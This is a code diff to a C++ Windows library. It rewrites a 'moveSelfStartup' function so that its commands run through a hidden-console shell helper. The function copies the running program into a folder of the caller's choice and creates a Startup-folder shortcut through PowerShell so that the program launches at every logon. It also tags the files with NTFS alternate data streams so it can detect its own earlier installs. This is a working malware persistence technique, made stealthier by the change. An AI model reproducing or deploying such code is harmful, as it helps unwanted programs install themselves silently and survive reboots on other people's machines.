@@ -119,20 +119,6 @@ extern "C" std::string __cdecl selectFile(std::string description) {
 extern "C" bool __cdecl access(const char* filePath) { return access_(gsfcp(filePath)); }
 extern "C" bool __cdecl isStartup() { return (access_(std::string(getSelfName()) + ":startup")); }
 
-extern "C" int __cdecl moveSelfStartup(const char* path_, const char* sName_) {//Use a full path (From drive letter to folder with '/' at the end!)
-    std::string self = getSelfName();
-    std::string path = gsfcp(path_);
-    std::string sName = gsfcp(sName_);
-    if (isStartup()) { return 1; }//The current file is already processed by this code. (Alternate Data Stream detected)
-    std::string pStartup = "C:/Users/" + std::string(getUName()) + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";
-    std::string psCmd = "powershell.exe -Command \"& { Set-Location '" + pStartup + "'; $ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut($pwd.Path + '\\" + sName + ".lnk'); $s.TargetPath = '" + path + self + "'; $s.WorkingDirectory = '" + path + "'; $s.Save() }\"";
-    std::string oneToRuleThemAll = "@echo off && type \"" + self + "\" >> \"" + path + self + "\" && echo check > \"" + path + self + ":startup\" && cd \"" + pStartup + "\" && " + psCmd + " && echo check > \"" + pStartup + sName + ".lnk:startup\"";
-
-    system(oneToRuleThemAll.c_str());
-
-    return 0;
-}
-
 extern "C" bool __cdecl quietShell(std::string command, std::string& result) {
     SECURITY_ATTRIBUTES saAttr;
     saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
@@ -177,6 +163,21 @@ extern "C" bool __cdecl quietShell(std::string command, std::string& result) {
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
     return true;
+}
+
+extern "C" int __cdecl moveSelfStartup(const char* path_, const char* sName_) {//Use a full path (From drive letter to folder with '/' at the end!)
+    std::string self = getSelfName();
+    std::string path = gsfcp(path_);
+    std::string sName = gsfcp(sName_);
+    std::string qsResult;
+    if (isStartup()) { return 1; }//The current file is already processed by this code. (Alternate Data Stream detected)
+    std::string pStartup = "C:/Users/" + std::string(getUName()) + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";
+    std::string psCmd = "powershell.exe -Command \"& { Set-Location '" + pStartup + "'; $ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut($pwd.Path + '\\" + sName + ".lnk'); $s.TargetPath = '" + path + self + "'; $s.WorkingDirectory = '" + path + "'; $s.Save() }\"";
+    std::string oneToRuleThemAll = "@echo off && type \"" + self + "\" >> \"" + path + self + "\" && echo check > \"" + path + self + ":startup\" && cd \"" + pStartup + "\" && " + psCmd + " && echo check > \"" + pStartup + sName + ".lnk:startup\"";
+
+    quietShell(oneToRuleThemAll, qsResult);
+
+    return 0;
 }
 
 extern "C" void __cdecl getTargetPath(std::string lnk, std::string& result) {
